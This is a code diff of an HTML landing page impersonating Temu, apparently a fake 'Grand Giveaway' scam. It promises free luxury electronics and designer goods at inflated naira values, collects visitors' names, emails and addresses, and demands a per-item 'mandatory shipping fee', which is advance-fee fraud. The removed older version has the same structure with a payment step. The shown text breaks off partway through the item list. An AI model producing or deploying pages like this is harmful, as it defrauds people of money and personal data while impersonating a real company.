@@ -3,566 +3,432 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Temu Celebration Giveaway - Confirm Shipping</title>
+    <title>TEMU | Grand Giveaway Claim</title>
     <!-- Load Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- Configure Tailwind theme for a festive and professional look -->
-    <script>
-        tailwind.config = {
-            theme: {
-                extend: {
-                    colors: {
-                        'temu-orange': '#FF6700',
-                        'temu-dark': '#1A1A1A',
-                        'temu-light': '#F8F8F8',
-                        'temu-accent': '#FFD700', 
-                        'temu-red': '#E53E3E', 
-                        'temu-green': '#38A169', 
-                    },
-                    fontFamily: {
-                        sans: ['Inter', 'sans-serif'],
-                    },
-                    boxShadow: {
-                        'glow': '0 0 15px rgba(255, 103, 0, 0.5)',
-                        'badge-glow': '0 0 8px rgba(255, 215, 0, 0.7)',
-                    }
-                }
-            }
-        }
-    </script>
+    <!-- Use Inter font -->
     <style>
-        /* Custom styles for professional appearance */
-        .item-card {
-            transition: all 0.3s ease;
-            cursor: pointer;
-            border: 3px solid transparent;
-            position: relative; 
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f7f7f7;
+            background-image: linear-gradient(135deg, #f7f7f7 0%, #e0f2fe 100%);
         }
+        /* Custom scrollbar for the items container */
+        .custom-scroll::-webkit-scrollbar {
+            width: 8px;
+        }
+        .custom-scroll::-webkit-scrollbar-track {
+            background: #e0f2fe;
+            border-radius: 10px;
+        }
+        .custom-scroll::-webkit-scrollbar-thumb {
+            background: #3b82f6;
+            border-radius: 10px;
+        }
+        .custom-scroll::-webkit-scrollbar-thumb:hover {
+            background: #2563eb;
+        }
+        /* Style for selected items */
         .item-card.selected {
-            border-color: #FFD700; 
-            box-shadow: 0 0 20px rgba(255, 215, 0, 0.8);
-            transform: scale(1.05);
-        }
-        .item-card:not(.selected):hover {
-            box-shadow: 0 0 10px rgba(255, 103, 0, 0.5);
-            transform: scale(1.02);
-        }
-        .free-badge {
-            position: absolute;
-            top: 10px;
-            right: 10px;
-            background-color: #E53E3E; 
-            color: white;
-            padding: 4px 10px;
-            border-radius: 9999px;
-            font-weight: bold;
-            font-size: 0.875rem; 
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.2);
-            z-index: 5;
-            transform: rotate(5deg);
+            border-color: #10b981;
+            background-color: #ecfdf5;
+            box-shadow: 0 4px 6px -1px rgba(16, 185, 129, 0.1), 0 2px 4px -2px rgba(16, 185, 129, 0.06);
         }
     </style>
 </head>
-<body class="bg-temu-dark text-temu-light min-h-screen font-sans">
+<body class="min-h-screen flex items-center justify-center p-4">
 
-    <!-- Header -->
-    <header class="bg-temu-orange py-4 shadow-lg sticky top-0 z-10">
-        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 flex justify-between items-center">
-            <h1 class="text-3xl font-extrabold text-white tracking-tight">
-                <span class="text-temu-accent">T</span>emu Gift Season
-            </h1>
-            <div id="selection-status" class="text-lg font-semibold bg-white text-temu-dark px-4 py-2 rounded-full shadow-md transition-all duration-300">
-                Step 1 of 2
-            </div>
-        </div>
-    </header>
-
-    <!-- Main Content -->
-    <main class="max-w-7xl mx-auto py-12 px-4 sm:px-6 lg:px-8">
+    <!-- Main Application Container -->
+    <div id="app-container" class="w-full max-w-4xl bg-white p-8 rounded-xl shadow-2xl transition-all duration-300">
         
-        <!-- ========================================================= -->
-        <!-- STEP 1: ITEM SELECTION & ADDRESS -->
-        <!-- ========================================================= -->
-        <div id="step-1-selection">
-            <div class="text-center mb-10">
-                <h2 class="text-5xl font-bold mb-3 text-temu-light">Pick Your Two FREE Gifts!</h2>
-                <p class="text-xl text-gray-300">
-                    Select **exactly two (2) items** below to proceed to shipping confirmation.
-                </p>
-            </div>
+        <header class="text-center mb-8 border-b pb-4">
+            <h1 class="text-4xl font-extrabold text-blue-600 mb-2">TEMU Grand Giveaway</h1>
+            <p class="text-xl text-gray-700">Claim Your 5 Valuable Items!</p>
+            <p class="text-sm text-red-500 font-semibold mt-2">Maximum of 5 items allowed per claim.</p>
+        </header>
 
-            <!-- Product Grid -->
-            <div id="product-grid" class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-6">
-                
-                <!-- Item 1: Smart Watch -->
-                <div id="item-1" data-name="Pro Smartwatch" data-weight="heavy" class="item-card bg-temu-dark rounded-xl overflow-hidden shadow-2xl p-4 text-center">
-                    <div class="free-badge">FREE</div>
-                    <!-- LOCAL IMAGE PATH: images/smartwatch.png -->
-                    <img src="images/smartwatch.png" onerror="this.onerror=null;this.src='https://placehold.co/300x300/1A1A1A/FFFFFF?text=Smart+Watch'" alt="Smart Watch" class="w-full h-auto rounded-lg mb-3">
-                    <h3 class="text-xl font-bold text-temu-accent">Pro Smartwatch</h3>
-                    <p class="text-gray-400 text-sm">Track fitness and calls easily.</p>
-                    <div class="mt-2 flex justify-center items-center space-x-2">
-                        <span class="text-gray-500 line-through text-md">$99.99</span>
-                        <span class="text-temu-red font-bold text-lg">FREE</span>
-                    </div>
-                </div>
+        <!-- Dynamic Content Area -->
+        <div id="dynamic-content">
 
-                <!-- Item 2: Bluetooth Speaker -->
-                <div id="item-2" data-name="Portable Bluetooth Speaker" data-weight="medium" class="item-card bg-temu-dark rounded-xl overflow-hidden shadow-2xl p-4 text-center">
-                    <div class="free-badge">FREE</div>
-                    <!-- LOCAL IMAGE PATH: images/speaker.png -->
-                    <img src="images/speaker.png" onerror="this.onerror=null;this.src='https://placehold.co/300x300/1A1A1A/FFFFFF?text=Bluetooth+Speaker'" alt="Bluetooth Speaker" class="w-full h-auto rounded-lg mb-3">
-                    <h3 class="text-xl font-bold text-temu-accent">Portable Bluetooth Speaker</h3>
-                    <p class="text-gray-400 text-sm">High-fidelity sound on the go.</p>
-                    <div class="mt-2 flex justify-center items-center space-x-2">
-                        <span class="text-gray-500 line-through text-md">$49.99</span>
-                        <span class="text-temu-red font-bold text-lg">FREE</span>
-                    </div>
-                </div>
+            <!-- Claim Form Section -->
+            <form id="claim-form" class="space-y-6">
 
-                <!-- Item 3: Wireless Earbuds -->
-                <div id="item-3" data-name="Luxury Wireless Earbuds" data-weight="light" class="item-card bg-temu-dark rounded-xl overflow-hidden shadow-2xl p-4 text-center">
-                    <div class="free-badge">FREE</div>
-                    <!-- LOCAL IMAGE PATH: images/earbuds.png -->
-                    <img src="images/earbuds.png" onerror="this.onerror=null;this.src='https://placehold.co/300x300/1A1A1A/FFFFFF?text=Wireless+Earbuds'" alt="Wireless Earbuds" class="w-full h-auto rounded-lg mb-3">
-                    <h3 class="text-xl font-bold text-temu-accent">Luxury Wireless Earbuds</h3>
-                    <p class="text-gray-400 text-sm">Crystal clear audio and mic.</p>
-                    <div class="mt-2 flex justify-center items-center space-x-2">
-                        <span class="text-gray-500 line-through text-md">$79.99</span>
-                        <span class="text-temu-red font-bold text-lg">FREE</span>
-                    </div>
-                </div>
-
-                <!-- Item 4: Home Security Camera -->
-                <div id="item-4" data-name="1080p Security Camera" data-weight="medium" class="item-card bg-temu-dark rounded-xl overflow-hidden shadow-2xl p-4 text-center">
-                    <div class="free-badge">FREE</div>
-                    <!-- LOCAL IMAGE PATH: images/camera.png -->
-                    <img src="images/camera.png" onerror="this.onerror=null;this.src='https://placehold.co/300x300/1A1A1A/FFFFFF?text=Security+Camera'" alt="Home Security Camera" class="w-full h-auto rounded-lg mb-3">
-                    <h3 class="text-xl font-bold text-temu-accent">1080p Security Camera</h3>
-                    <p class="text-gray-400 text-sm">Keep your home safe 24/7.</p>
-                    <div class="mt-2 flex justify-center items-center space-x-2">
-                        <span class="text-gray-500 line-through text-md">$65.00</span>
-                        <span class="text-temu-red font-bold text-lg">FREE</span>
-                    </div>
-                </div>
-                
-                <!-- Item 5: Gaming Mouse -->
-                <div id="item-5" data-name="Ergonomic Gaming Mouse" data-weight="light" class="item-card bg-temu-dark rounded-xl overflow-hidden shadow-2xl p-4 text-center">
-                    <div class="free-badge">FREE</div>
-                    <!-- LOCAL IMAGE PATH: images/mouse.png -->
-                    <img src="images/mouse.png" onerror="this.onerror=null;this.src='https://placehold.co/300x300/1A1A1A/FFFFFF?text=Gaming+Mouse'" alt="Gaming Mouse" class="w-full h-auto rounded-lg mb-3">
-                    <h3 class="text-xl font-bold text-temu-accent">Ergonomic Gaming Mouse</h3>
-                    <p class="text-gray-400 text-sm">Precision and speed for pro gamers.</p>
-                    <div class="mt-2 flex justify-center items-center space-x-2">
-                        <span class="text-gray-500 line-through text-md">$35.99</span>
-                        <span class="text-temu-red font-bold text-lg">FREE</span>
-                    </div>
-                </div>
-
-                <!-- Item 6: Portable Mini Blender -->
-                <div id="item-6" data-name="Portable Mini Blender" data-weight="medium" class="item-card bg-temu-dark rounded-xl overflow-hidden shadow-2xl p-4 text-center">
-                    <div class="free-badge">FREE</div>
-                    <!-- LOCAL IMAGE PATH: images/blender.png -->
-                    <img src="images/blender.png" onerror="this.onerror=null;this.src='https://placehold.co/300x300/1A1A1A/FFFFFF?text=Mini+Blender'" alt="Mini Blender" class="w-full h-auto rounded-lg mb-3">
-                    <h3 class="text-xl font-bold text-temu-accent">Portable Mini Blender</h3>
-                    <p class="text-gray-400 text-sm">Fresh smoothies anywhere.</p>
-                    <div class="mt-2 flex justify-center items-center space-x-2">
-                        <span class="text-gray-500 line-through text-md">$40.00</span>
-                        <span class="text-temu-red font-bold text-lg">FREE</span>
-                    </div>
-                </div>
-
-                <!-- Item 7: Power Bank -->
-                <div id="item-7" data-name="20000mAh Power Bank" data-weight="light" class="item-card bg-temu-dark rounded-xl overflow-hidden shadow-2xl p-4 text-center">
-                    <div class="free-badge">FREE</div>
-                    <!-- LOCAL IMAGE PATH: images/powerbank.png -->
-                    <img src="images/powerbank.png" onerror="this.onerror=null;this.src='https://placehold.co/300x300/1A1A1A/FFFFFF?text=Power+Bank'" alt="Power Bank" class="w-full h-auto rounded-lg mb-3">
-                    <h3 class="text-xl font-bold text-temu-accent">20000mAh Power Bank</h3>
-                    <p class="text-gray-400 text-sm">High-capacity portable charger.</p>
-                    <div class="mt-2 flex justify-center items-center space-x-2">
-                        <span class="text-gray-500 line-through text-md">$29.99</span>
-                        <span class="text-temu-red font-bold text-lg">FREE</span>
-                    </div>
-                </div>
-
-                <!-- Item 8: Electric Neck Massager -->
-                <div id="item-8" data-name="Electric Neck Massager" data-weight="heavy" class="item-card bg-temu-dark rounded-xl overflow-hidden shadow-2xl p-4 text-center">
-                    <div class="free-badge">FREE</div>
-                    <!-- LOCAL IMAGE PATH: images/massager.png -->
-                    <img src="images/massager.png" onerror="this.onerror=null;this.src='https://placehold.co/300x300/1A1A1A/FFFFFF?text=Neck+Massager'" alt="Neck Massager" class="w-full h-auto rounded-lg mb-3">
-                    <h3 class="text-xl font-bold text-temu-accent">Electric Neck Massager</h3>
-                    <p class="text-gray-400 text-sm">Relieve stress and tension.</p>
-                    <div class="mt-2 flex justify-center items-center space-x-2">
-                        <span class="text-gray-500 line-through text-md">$55.00</span>
-                        <span class="text-temu-red font-bold text-lg">FREE</span>
-                    </div>
-                </div>
-                
-            </div>
-
-            <!-- Contact/Address Form -->
-            <div class="mt-12 p-8 bg-temu-orange/10 rounded-2xl shadow-xl border border-temu-orange/50">
-                <h3 class="text-3xl font-bold text-temu-light mb-6">Confirm Shipping Information</h3>
-
-                <div id="selected-list" class="mb-6 p-4 bg-temu-dark rounded-lg border border-temu-accent/50">
-                    <p class="text-temu-accent font-semibold">Selected Items: <span id="item-names">None selected.</span></p>
-                    <p id="error-message" class="text-red-400 mt-2 hidden">Please select exactly two items to proceed.</p>
-                </div>
-
-                <form id="contact-form">
-                    <h4 class="text-xl font-semibold text-gray-200 mb-4 border-b border-gray-600 pb-2">Contact Details</h4>
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
-                        <div>
-                            <label for="name" class="block text-sm font-medium text-gray-300">Full Name</label>
-                            <input type="text" id="name" name="name" required class="mt-1 block w-full px-4 py-3 border border-gray-600 rounded-lg shadow-sm bg-temu-dark text-temu-light focus:ring-temu-orange focus:border-temu-orange">
-                        </div>
-                        <div>
-                            <label for="email" class="block text-sm font-medium text-gray-300">Email Address</label>
-                            <input type="email" id="email" name="email" required class="mt-1 block w-full px-4 py-3 border border-gray-600 rounded-lg shadow-sm bg-temu-dark text-temu-light focus:ring-temu-orange focus:border-temu-orange">
-                        </div>
-                    </div>
-
-                    <h4 class="text-xl font-semibold text-gray-200 mb-4 border-b border-gray-600 pb-2">Current Shipping Address</h4>
-                    <div class="grid grid-cols-1 gap-6">
-                        <div>
-                            <label for="address1" class="block text-sm font-medium text-gray-300">Address Line 1</label>
-                            <input type="text" id="address1" name="address1" required class="mt-1 block w-full px-4 py-3 border border-gray-600 rounded-lg shadow-sm bg-temu-dark text-temu-light focus:ring-temu-orange focus:border-temu-orange">
-                        </div>
-                        <div>
-                            <label for="address2" class="block text-sm font-medium text-gray-300">Address Line 2 (Apt, Suite, etc. - Optional)</label>
-                            <input type="text" id="address2" name="address2" class="mt-1 block w-full px-4 py-3 border border-gray-600 rounded-lg shadow-sm bg-temu-dark text-temu-light focus:ring-temu-orange focus:border-temu-orange">
-                        </div>
-                        <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
-                            <div>
-                                <label for="city" class="block text-sm font-medium text-gray-300">City</label>
-                                <input type="text" id="city" name="city" required class="mt-1 block w-full px-4 py-3 border border-gray-600 rounded-lg shadow-sm bg-temu-dark text-temu-light focus:ring-temu-orange focus:border-temu-orange">
-                            </div>
-                            <div>
-                                <label for="state" class="block text-sm font-medium text-gray-300">State / Province</label>
-                                <input type="text" id="state" name="state" required class="mt-1 block w-full px-4 py-3 border border-gray-600 rounded-lg shadow-sm bg-temu-dark text-temu-light focus:ring-temu-orange focus:border-temu-orange">
-                            </div>
-                            <div>
-                                <label for="zip" class="block text-sm font-medium text-gray-300">Zip / Postal Code</label>
-                                <input type="text" id="zip" name="zip" required class="mt-1 block w-full px-4 py-3 border border-gray-600 rounded-lg shadow-sm bg-temu-dark text-temu-light focus:ring-temu-orange focus:border-temu-orange">
-                            </div>
-                        </div>
-                    </div>
-
+                <!-- Step 1: Item Selection -->
+                <section>
+                    <h2 class="text-2xl font-semibold text-gray-800 mb-4 flex items-center">
+                        <svg class="w-6 h-6 mr-2 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5H7a2 2 0 00-2 2v12a2 2 0 002 2h10a2 2 0 002-2V7a2 2 0 00-2-2h-2M9 5a2 2 0 002 2h2a2 2 0 002-2M9 5a2 2 0 012-2h2a2 2 0 012 2m-3 7h3m-3 4h3m-6-4h.01M9 16h.01"></path></svg>
+                        1. Select Your Items (Max 5)
+                    </h2>
                     
-                    <button type="submit" id="continue-button" disabled class="mt-8 w-full px-6 py-4 bg-gray-500 text-temu-light font-bold rounded-xl text-xl shadow-lg transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed">
-                        <span id="button-text">Select 2 Items to Continue</span>
+                    <!-- Items Grid Container -->
+                    <div id="items-container" class="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4 max-h-96 overflow-y-auto p-2 bg-gray-50 rounded-lg border custom-scroll">
+                        <!-- Items will be injected here by JavaScript -->
+                    </div>
+
+                    <!-- Summary Bar -->
+                    <div class="mt-4 p-3 bg-blue-100 rounded-lg flex justify-between items-center text-blue-800 font-semibold shadow-inner">
+                        <span id="item-count">Selected: 0 / 5</span>
+                        <span id="shipping-fee">Estimated Shipping Fee (NGN): 0.00</span>
+                    </div>
+                </section>
+
+                <!-- Step 2: User Information -->
+                <section>
+                    <h2 class="text-2xl font-semibold text-gray-800 mb-4 flex items-center">
+                        <svg class="w-6 h-6 mr-2 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z"></path></svg>
+                        2. Contact & Shipping Details
+                    </h2>
+
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <input type="text" id="name" placeholder="Full Name" required 
+                               class="p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500 w-full transition duration-150">
+                        <input type="email" id="email" placeholder="Email Address" required 
+                               class="p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500 w-full transition duration-150">
+                    </div>
+
+                    <textarea id="address" placeholder="Full Shipping Address (Street, City, State, ZIP)" rows="3" required 
+                              class="mt-4 p-3 border border-gray-300 rounded-lg focus:ring-blue-500 focus:border-blue-500 w-full transition duration-150"></textarea>
+                </section>
+
+                <!-- Step 3: Payment/Submission -->
+                <section>
+                    <h2 class="text-2xl font-semibold text-gray-800 mb-4 flex items-center">
+                        <svg class="w-6 h-6 mr-2 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z"></path></svg>
+                        3. Confirm Payment and Claim
+                    </h2>
+
+                    <div class="p-4 bg-yellow-50 border-l-4 border-yellow-500 text-yellow-800 rounded-lg shadow-md mb-4">
+                        <p class="font-bold">Shipping Notice:</p>
+                        <p class="text-sm">You are claiming your items for free, but a mandatory shipping/logistics fee of **₦<span id="final-shipping-fee">0.00</span>** must be paid upon delivery. By submitting, you confirm this agreement.</p>
+                    </div>
+
+                    <button type="submit" id="submit-button" 
+                            class="w-full py-3 px-4 bg-green-600 text-white font-bold rounded-lg hover:bg-green-700 transition duration-300 transform hover:scale-[1.01] flex items-center justify-center disabled:opacity-50">
+                        <span id="button-text">CONFIRM CLAIM & SHIPMENT AGREEMENT</span>
+                        <svg id="loading-spinner" class="animate-spin -ml-1 mr-3 h-5 w-5 text-white hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                        </svg>
                     </button>
-                </form>
-            </div>
+                </section>
+            </form>
+
         </div>
 
-
-        <!-- ========================================================= -->
-        <!-- STEP 2: SHIPPING FEE REVIEW -->
-        <!-- ========================================================= -->
-        <div id="step-2-shipping" class="hidden">
-            <div class="bg-temu-orange/10 p-8 rounded-2xl shadow-xl border border-temu-accent max-w-2xl mx-auto">
-                <h2 class="text-4xl font-bold text-temu-accent mb-4 text-center">Shipping & Handling Confirmation</h2>
-                <p class="text-lg text-gray-300 mb-8 text-center">
-                    Your **<span id="shipping-item-names" class="font-semibold text-temu-light"></span>** are free. Confirm the final shipping fee below to claim them immediately.
-                </p>
-
-                <div class="space-y-4 text-lg">
-                    <div class="flex justify-between border-b border-gray-700 pb-2">
-                        <span>Items Subtotal:</span>
-                        <span class="font-bold text-temu-red line-through">₦200,000.00</span>
-                    </div>
-                    <div class="flex justify-between border-b border-gray-700 pb-2">
-                        <span>Promotional Discount:</span>
-                        <span class="font-bold text-temu-green">-₦200,000.00</span>
-                    </div>
-                    <div class="flex justify-between border-b border-gray-700 pb-2">
-                        <span>Estimated Shipping Fee:</span>
-                        <span id="shipping-fee" class="font-bold text-temu-light">--</span>
-                    </div>
-                    <div class="flex justify-between pt-4 border-t-2 border-temu-accent">
-                        <span class="text-2xl font-extrabold">TOTAL DUE:</span>
-                        <span id="total-due" class="text-2xl font-extrabold text-temu-orange">--</span>
-                    </div>
-                </div>
-
-                <p class="text-sm text-gray-400 mt-6 text-center">
-                    (Note: Shipping fees vary based on location and the combined weight of selected items.)
-                </p>
-
-                <button id="pay-now-button" class="mt-8 w-full px-6 py-4 bg-temu-orange text-white font-bold rounded-xl text-xl shadow-lg hover:bg-temu-orange/80 transition-all duration-300">
-                    Proceed to Secure Payment
-                </button>
-                <button id="back-button" class="mt-4 w-full px-6 py-3 bg-gray-700 text-gray-300 font-semibold rounded-xl text-lg hover:bg-gray-600 transition-all duration-300">
-                    &larr; Go Back to Edit Selection
-                </button>
-            </div>
-        </div>
-
-        <!-- Success/Error Message Modal -->
-        <div id="message-box" class="fixed inset-0 bg-black bg-opacity-75 z-20 flex items-center justify-center hidden" role="alert">
-            <div class="bg-temu-dark p-8 rounded-xl max-w-md w-full shadow-glow border border-temu-accent">
-                <h4 id="message-title" class="text-2xl font-bold mb-4 text-temu-accent"></h4>
-                <p id="message-content" class="text-gray-300 mb-6"></p>
-                <button id="close-modal" class="w-full bg-temu-orange hover:bg-temu-orange/80 text-white font-semibold py-3 rounded-lg transition duration-200">
+        <!-- Message Modal (Hidden by default) -->
+        <div id="message-modal" class="hidden fixed inset-0 bg-gray-900 bg-opacity-75 flex items-center justify-center p-4 z-50">
+            <div class="bg-white p-8 rounded-xl shadow-3xl max-w-sm w-full text-center space-y-4">
+                <svg id="modal-icon" class="w-16 h-16 mx-auto" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" xmlns="http://www.w3.org/2000/svg">
+                    <!-- Icon placeholder -->
+                </svg>
+                <h3 id="modal-title" class="text-2xl font-bold">Message Title</h3>
+                <p id="modal-body" class="text-gray-600">Message body content.</p>
+                <button onclick="window.location.reload();" class="w-full py-2 px-4 bg-blue-600 text-white font-semibold rounded-lg hover:bg-blue-700 transition duration-150">
                     Close
                 </button>
             </div>
         </div>
 
-    </main>
+    </div>
 
-    <!-- JavaScript Logic -->
     <script>
-        // Global state storage for multi-step form
-        let appState = {
-            maxSelections: 2,
-            selectedItems: [],
-            contactData: {},
-            shippingFee: 0
+        const API_ENDPOINT = '/submit-claim';
+        const MAX_ITEMS = 5;
+        const SHIPPING_FEE_PER_ITEM = 5000; // ₦5,000 per item for logistics
+
+        const ELEMENTS = {
+            itemsContainer: document.getElementById('items-container'),
+            itemCount: document.getElementById('item-count'),
+            shippingFeeDisplay: document.getElementById('shipping-fee'),
+            finalShippingFeeDisplay: document.getElementById('final-shipping-fee'),
+            claimForm: document.getElementById('claim-form'),
+            submitButton: document.getElementById('submit-button'),
+            loadingSpinner: document.getElementById('loading-spinner'),
+            buttonText: document.getElementById('button-text'),
+            messageModal: document.getElementById('message-modal'),
+            modalIcon: document.getElementById('modal-icon'),
+            modalTitle: document.getElementById('modal-title'),
+            modalBody: document.getElementById('modal-body'),
         };
 
-        // DOM elements
-        const step1 = document.getElementById('step-1-selection');
-        const step2 = document.getElementById('step-2-shipping');
-        const statusElement = document.getElementById('selection-status');
-        const productGrid = document.getElementById('product-grid');
-        const itemNamesElement = document.getElementById('item-names');
-        const errorElement = document.getElementById('error-message');
-        const continueButton = document.getElementById('continue-button');
-        const buttonText = document.getElementById('button-text');
-        const contactForm = document.getElementById('contact-form');
-        
-        const shippingItemNames = document.getElementById('shipping-item-names');
-        const shippingFeeElement = document.getElementById('shipping-fee');
-        const totalDueElement = document.getElementById('total-due');
-        const payNowButton = document.getElementById('pay-now-button');
-        const backButton = document.getElementById('back-button');
-        
-        const messageBox = document.getElementById('message-box');
-        const messageTitle = document.getElementById('message-title');
-        const messageContent = document.getElementById('message-content');
-        const closeModalButton = document.getElementById('close-modal');
+        const itemDatabase = [
+            // ELECTRONICS & TECH (25 items)
+            { id: 1, name: "Apple iPhone 15 Pro Max", category: "Electronics", value: "₦1,800,000", icon: "📱" },
+            { id: 2, name: "Samsung Galaxy S24 Ultra", category: "Electronics", value: "₦1,600,000", icon: "📱" },
+            { id: 3, name: "Sony PS5 Console (Disc)", category: "Electronics", value: "₦750,000", icon: "🎮" },
+            { id: 4, name: "Microsoft Xbox Series X", category: "Electronics", value: "₦700,000", icon: "🎮" },
+            { id: 5, name: "MacBook Pro M3 Max", category: "Electronics", value: "₦4,500,000", icon: "💻" },
+            { id: 6, name: "Dell XPS 15 Laptop", category: "Electronics", value: "₦2,200,000", icon: "💻" },
+            { id: 7, name: "DJI Mavic 3 Pro Drone", category: "Electronics", value: "₦1,500,000", icon: "🚁" },
+            { id: 8, name: "Oculus Meta Quest 3 VR", category: "Electronics", value: "₦850,000", icon: "🕶️" },
+            { id: 9, name: "Samsung 65\" OLED TV", category: "Electronics", value: "₦3,000,000", icon: "📺" },
+            { id: 10, name: "Bose QuietComfort Ultra", category: "Electronics", value: "₦450,000", icon: "🎧" },
+            { id: 11, name: "Apple Watch Ultra 2", category: "Electronics", value: "₦650,000", icon: "⌚" },
+            { id: 12, name: "Canon EOS R5 Camera", category: "Electronics", value: "₦3,500,000", icon: "📸" },
+            { id: 13, name: "Google Pixel 8 Pro", category: "Electronics", value: "₦1,400,000", icon: "📱" },
+            { id: 14, name: "iPad Pro 12.9 (M2)", category: "Electronics", value: "₦1,300,000", icon: " tablet" },
+            { id: 15, name: "Logitech G Pro Racing Wheel", category: "Electronics", value: "₦600,000", icon: "🏎️" },
+            { id: 16, name: "Samsung Galaxy Tab S9 Ultra", category: "Electronics", value: "₦1,000,000", icon: " tablet" },
+            { id: 17, name: "GoPro HERO12 Black", category: "Electronics", value: "₦400,000", icon: "🎥" },
+            { id: 18, name: "High-End Gaming PC (RTX 4090)", category: "Electronics", value: "₦5,000,000", icon: "🖥️" },
+            { id: 19, name: "Sonos Arc Soundbar", category: "Electronics", value: "₦800,000", icon: "🔊" },
+            { id: 20, name: "AirPods Pro (2nd Gen)", category: "Electronics", value: "₦300,000", icon: "🎧" },
+            { id: 21, name: "Tesla Powerwall 2 (Battery)", category: "Electronics", value: "₦6,000,000", icon: "⚡" },
+            { id: 22, name: "Smart Home Security System", category: "Electronics", value: "₦550,000", icon: "🔒" },
+            { id: 23, name: "Kindle Oasis (Latest Gen)", category: "Electronics", value: "₦250,000", icon: "📖" },
+            { id: 24, name: "HP Spectre x360", category: "Electronics", value: "₦1,900,000", icon: "💻" },
+            { id: 25, name: "FPV Racing Drone Kit", category: "Electronics", value: "₦950,000", icon: "✈️" },
+            
+            // FASHION & LUXURY (25 items)
+            { id: 26, name: "Rolex Submariner Watch", category: "Luxury", value: "₦10,000,000", icon: "👑" },
+            { id: 27, name: "Gucci Dionysus Bag", category: "Luxury", value: "₦3,500,000", icon: "👜" },
+            { id: 28, name: "Louis Vuitton Keepall Bandoulière", category: "Luxury", value: "₦4,000,000", icon: "💼" },
+            { id: 29, name: "Valentino Garavani Sneakers", category: "Fashion", value: "₦800,000", icon: "👟" },
+            { id: 30, name: "Balenciaga Puffer Jacket", category: "Fashion", value: "₦2,500,000", icon: "🧥" },
+            { id: 31, name: "Burberry Trench Coat", category: "Fashion", value: "₦3,000,000", icon: "🧥" },
+            { id: 32, name: "Cartier Love Bracelet", category: "Luxury", value: "₦7,000,000", icon: "💍" },
+            { id: 33, name: "Chanel Classic Flap Bag", category: "Luxury", value: "₦12,000,000", icon: "👜" },
+            { id: 34, name: "Dior B23 High-Top Sneaker", category: "Fashion", value: "₦1,200,000", icon: "👟" },
+            { id: 35, name: "Fendi Zucca Scarf", category: "Fashion", value: "₦500,000", icon: "🧣" },
+            { id: 36, name: "Prada Nylon Backpack", category: "Fashion", value: "₦2,800,000", icon: "🎒" },
+            { id: 37, name: "Omega Seamaster Watch", category: "Luxury", value: "₦5,500,000", icon: "⌚" },
+            { id: 38, name: "Hermès Birkin Bag (Mini)", category: "Luxury", value: "₦30,000,000", icon: "👜" },
+            { id: 39, name: "Tiffany & Co. Diamond Necklace", category: "Luxury", value: "₦8,000,000", icon: "💎" },
+            { id: 40, name: "Saint Laurent Leather Jacket", category: "Fashion", value: "₦4,500,000", icon: "🧥" },
+            { id: 41, name: "Nike Air Jordan 1 OG (Rare)", category: "Fashion", value: "₦1,500,000", icon: "👟" },
+            { id: 42, name: "Versace Baroque Robe", category: "Fashion", value: "₦900,000", icon: "🛁" },
+            { id: 43, name: "Montblanc Meisterstück Pen", category: "Luxury", value: "₦400,000", icon: "🖋️" },
+            { id: 44, name: "Bvlgari Serpenti Sunglasses", category: "Fashion", value: "₦750,000", icon: "🕶️" },
+            { id: 45, name: "Tom Ford Suit (Bespoke)", category: "Luxury", value: "₦6,000,000", icon: "🤵" },
+            { id: 46, name: "Christian Louboutin Heels", category: "Fashion", value: "₦1,100,000", icon: "👠" },
+            { id: 47, name: "Givenchy Antigona Bag", category: "Fashion", value: "₦3,200,000", icon: "👜" },
+            { id: 48, name: "Patek Philippe Cufflinks", category: "Luxury", value: "₦1,800,000", icon: "🔗" },
+            { id: 49, name: "Canada Goose Expedition Parka", category: "Fashion", value: "₦1,600,000", icon: "🧥" },
+            { id: 50, name: "Fendi Baguette Bag", category: "Luxury", value: "₦4,800,000", icon: "👜" },
 
+            // HOME, KITCHEN & LIFESTYLE (25 items)
+            { id: 51, name: "Viking Professional 7 Series Range", category: "Home", value: "₦4,000,000", icon: "🍳" },
+            { id: 52, name: "Smeg Retro Refrigerator", category: "Home", value: "₦1,500,000", icon: "🧊" },
+            { id: 53, name: "Peloton Bike+ Full Package", category: "Lifestyle", value: "₦1,800,000", icon: "🚴" },
+            { id: 54, name: "Dyson V15 Detect Vacuum", category: "Home", value: "₦500,000", icon: "🧹" },
